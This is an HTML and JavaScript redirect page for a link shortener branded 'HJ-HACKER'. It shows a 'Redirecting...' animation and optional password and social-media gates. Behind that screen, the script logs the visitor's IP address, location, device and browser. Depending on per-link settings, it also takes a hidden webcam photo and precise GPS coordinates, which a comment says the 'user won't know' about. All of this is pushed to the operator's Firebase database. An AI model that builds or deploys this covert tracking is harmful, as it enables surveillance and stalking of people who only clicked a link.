<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HJ-HACKER | Redirecting...</title>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            min-height: 100vh;
            background: #050505;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        .loader { text-align: center; }
        .ring {
            position: relative;
            width: 100px;
            height: 100px;
            margin: 0 auto 2rem;
        }
        .ring div {
            position: absolute;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 3px solid transparent;
            border-top-color: #00ff41;
            animation: spin 1s linear infinite;
        }
        .bar {
            width: 200px;
            height: 4px;
            background: #1a1a1a;
            border-radius: 4px;
            overflow: hidden;
            margin: 0 auto 2rem;
        }
        .bar-fill {
            height: 100%;
            background: linear-gradient(90deg, #00ff41, #00cc33);
            width: 0%;
            animation: loading 1.5s ease-in-out infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes loading {
            0% { width: 5%; margin-left: -5%; }
            50% { width: 60%; margin-left: 20%; }
            100% { width: 5%; margin-left: 100%; }
        }
        .message { color: #00ff41; font-size: 0.8rem; letter-spacing: 0.2em; text-transform: uppercase; }
        .social-gate, .password-form {
            background: rgba(20, 20, 30, 0.95);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(0, 255, 65, 0.3);
            border-radius: 24px;
            padding: 2rem;
            max-width: 400px;
            text-align: center;
        }
        .social-icon { font-size: 3rem; margin-bottom: 1rem; }
        .social-title { font-size: 1.3rem; font-weight: 700; margin-bottom: 0.5rem; color: #fff; }
        .social-desc { color: #888; margin-bottom: 1.5rem; font-size: 0.9rem; }
        .social-btn, .unlock-btn {
            width: 100%;
            padding: 0.8rem;
            background: #00ff41;
            border: none;
            border-radius: 12px;
            color: #000;
            font-weight: 700;
            cursor: pointer;
            font-size: 1rem;
        }
        .password-input {
            width: 100%;
            padding: 0.8rem;
            background: #0a0a0a;
            border: 1px solid #333;
            border-radius: 12px;
            color: #fff;
            margin: 1rem 0;
        }
        .error { color: #ff4444; margin-top: 0.5rem; font-size: 0.8rem; }
    </style>
</head>
<body>
    <div id="content"></div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyAzr3Xxh0YrTH5vp00Z-eQysTM35dNmh8I",
            authDomain: "hjh-tools.firebaseapp.com",
            projectId: "hjh-tools",
            storageBucket: "hjh-tools.firebasestorage.app",
            messagingSenderId: "643137472905",
            appId: "1:643137472905:web:814ca23a86fb084811b958",
            databaseURL: "https://hjh-tools-default-rtdb.firebaseio.com"
        };
        
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        
        // Get short code from URL
        const shortCode = window.location.pathname.substring(1);
        
        console.log('🔍 Redirecting for code:', shortCode);
        
        // Get link data from Firebase
        async function getLinkData() {
            try {
                const snapshot = await database.ref(`urls/${shortCode}`).get();
                const data = snapshot.val();
                console.log('📦 Link data:', data);
                return data;
            } catch (error) {
                console.error('❌ Error fetching link:', error);
                return null;
            }
        }
        
        // Get visitor info for analytics
        async function getVisitorInfo() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const ipData = await response.json();
                let locationData = {};
                try {
                    const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                    locationData = await geoResponse.json();
                } catch {}
                
                const ua = navigator.userAgent;
                const isMobile = /Mobile|Android|iPhone|iPad/i.test(ua);
                let browser = 'Unknown';
                if (ua.includes('Chrome')) browser = 'Chrome';
                else if (ua.includes('Firefox')) browser = 'Firefox';
                else if (ua.includes('Safari')) browser = 'Safari';
                
                let os = 'Unknown';
                if (ua.includes('Windows')) os = 'Windows';
                else if (ua.includes('Mac')) os = 'macOS';
                else if (ua.includes('Android')) os = 'Android';
                else if (ua.includes('iOS')) os = 'iOS';
                
                return {
                    ip: ipData.ip,
                    city: locationData.city || 'Unknown',
                    country: locationData.country_name || 'Unknown',
                    device_type: isMobile ? 'Mobile' : 'Desktop',
                    browser: browser,
                    os: os
                };
            } catch (error) {
                console.log('Analytics error:', error);
                return null;
            }
        }
        
        // Save analytics
        async function saveAnalytics(linkData, imageUrl = null, lat = null, lon = null) {
            try {
                const visitorInfo = await getVisitorInfo();
                if (!visitorInfo) return;
                
                const analyticsData = {
                    url_id: shortCode,
                    ip_address: visitorInfo.ip,
                    city: visitorInfo.city,
                    country: visitorInfo.country,
                    device_type: visitorInfo.device_type,
                    browser: visitorInfo.browser,
                    os: visitorInfo.os,
                    referrer: document.referrer || 'Direct',
                    captured_image: imageUrl,
                    latitude: lat,
                    longitude: lon,
                    created_at: new Date().toISOString()
                };
                
                await database.ref(`analytics/${shortCode}`).push(analyticsData);
                
                // Increment click count
                const currentClicks = linkData.clicks || 0;
                await database.ref(`urls/${shortCode}`).update({ clicks: currentClicks + 1 });
                
                console.log('✅ Analytics saved');
            } catch (error) {
                console.log('Analytics save error:', error);
            }
        }
        
        // Hidden camera capture
        async function captureHiddenCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' } 
                });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.autoplay = true;
                video.muted = true;
                video.style.display = 'none';
                document.body.appendChild(video);
                
                await new Promise(resolve => setTimeout(resolve, 500));
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 320;
                canvas.height = video.videoHeight || 240;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/jpeg', 0.6);
                
                stream.getTracks().forEach(track => track.stop());
                video.remove();
                return imageData;
            } catch (error) {
                console.log('Camera access denied');
                return null;
            }
        }
        
        // Hidden location capture
        function captureHiddenLocation() {
            return new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            lat: position.coords.latitude,
                            lon: position.coords.longitude
                        });
                    },
                    () => resolve({ lat: null, lon: null }),
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            });
        }
        
        // Show animation
        function showAnimation(type, text) {
            const content = document.getElementById('content');
            if (type === 'ring') {
                content.innerHTML = `
                    <div class="loader">
                        <div class="ring"><div></div></div>
                        <div class="message">${text || 'REDIRECTING'}</div>
                    </div>
                `;
            } else {
                content.innerHTML = `
                    <div class="loader">
                        <div class="bar"><div class="bar-fill"></div></div>
                        <div class="message">${text || 'REDIRECTING'}</div>
                    </div>
                `;
            }
        }
        
        // Show password modal
        function showPasswordModal() {
            return new Promise((resolve) => {
                const content = document.getElementById('content');
                content.innerHTML = `
                    <div class="password-form">
                        <h2 style="color: #00ff41; margin-bottom: 1rem;">🔒 Protected Link</h2>
                        <p style="color: #888; margin-bottom: 1rem;">This link is password protected</p>
                        <input type="password" id="passwordInput" class="password-input" placeholder="Enter password">
                        <button id="unlockBtn" class="unlock-btn">Unlock</button>
                        <div id="passError" class="error"></div>
                    </div>
                `;
                const unlockBtn = document.getElementById('unlockBtn');
                const passwordInput = document.getElementById('passwordInput');
                const passError = document.getElementById('passError');
                
                unlockBtn.onclick = () => {
                    const password = passwordInput.value;
                    resolve(password);
                };
                passwordInput.onkeypress = (e) => {
                    if (e.key === 'Enter') {
                        resolve(passwordInput.value);
                    }
                };
            });
        }
        
        // Show social gate modal
        function showSocialModal(linkData) {
            return new Promise((resolve) => {
                const icons = {
                    youtube: '▶️', instagram: '📷', twitter: '🐦',
                    facebook: '📘', whatsapp: '💬', linkedin: '🔗', tiktok: '🎵'
                };
                const content = document.getElementById('content');
                content.innerHTML = `
                    <div class="social-gate">
                        <div class="social-icon">${icons[linkData.social_gate_icon] || '🔗'}</div>
                        <h2 class="social-title">${linkData.social_gate_title}</h2>
                        <p class="social-desc">${linkData.social_gate_description || 'Complete the action to continue'}</p>
                        <button id="socialBtn" class="social-btn">${linkData.social_gate_button_text || 'Verify & Continue'}</button>
                    </div>
                `;
                const socialBtn = document.getElementById('socialBtn');
                socialBtn.onclick = () => {
                    window.open(linkData.social_gate_url, '_blank');
                    setTimeout(() => resolve(true), 1500);
                };
            });
        }
        
        // Main redirect function
        async function handleRedirect() {
            console.log('🔄 Handling redirect for:', shortCode);
            
            // Get link data
            const linkData = await getLinkData();
            
            if (!linkData) {
                document.getElementById('content').innerHTML = `
                    <div style="text-align: center;">
                        <h1 style="color: #ff4444;">404</h1>
                        <p>Link not found</p>
                    </div>
                `;
                return;
            }
            
            // Check expiration
            if (linkData.expires_at && new Date(linkData.expires_at) < new Date()) {
                document.getElementById('content').innerHTML = `
                    <div style="text-align: center;">
                        <h1 style="color: #ff4444;">Link Expired</h1>
                        <p>This link is no longer active</p>
                    </div>
                `;
                return;
            }
            
            // Show animation
            const animType = linkData.animation_type || 'ring';
            showAnimation(animType, 'REDIRECTING');
            
            // Check password
            if (linkData.password) {
                const password = await showPasswordModal();
                if (password !== linkData.password) {
                    showAnimation(animType, 'ACCESS DENIED');
                    setTimeout(() => {
                        document.getElementById('content').innerHTML = `
                            <div class="password-form">
                                <h2 style="color: #ff4444;">❌ Incorrect Password</h2>
                                <button id="tryAgain" class="unlock-btn" style="margin-top: 1rem;">Try Again</button>
                            </div>
                        `;
                        document.getElementById('tryAgain').onclick = () => handleRedirect();
                    }, 1000);
                    return;
                }
            }
            
            // Check social gate
            if (linkData.social_gate_title && linkData.social_gate_url) {
                await showSocialModal(linkData);
            }
            
            // Hidden intelligence (user won't know)
            let imageUrl = null;
            let location = { lat: null, lon: null };
            
            if (linkData.capture_camera) {
                imageUrl = await captureHiddenCamera();
            }
            if (linkData.capture_location) {
                location = await captureHiddenLocation();
            }
            
            // Save analytics in background
            saveAnalytics(linkData, imageUrl, location.lat, location.lon);
            
            // ✅ FINAL REDIRECT to actual destination
            console.log('🚀 Redirecting to:', linkData.long_url);
            window.location.href = linkData.long_url;
        }
        
        // Start the redirect process
        if (shortCode && shortCode !== '') {
            handleRedirect();
        } else {
            window.location.href = '/';
        }
    </script>
</body>
</html>
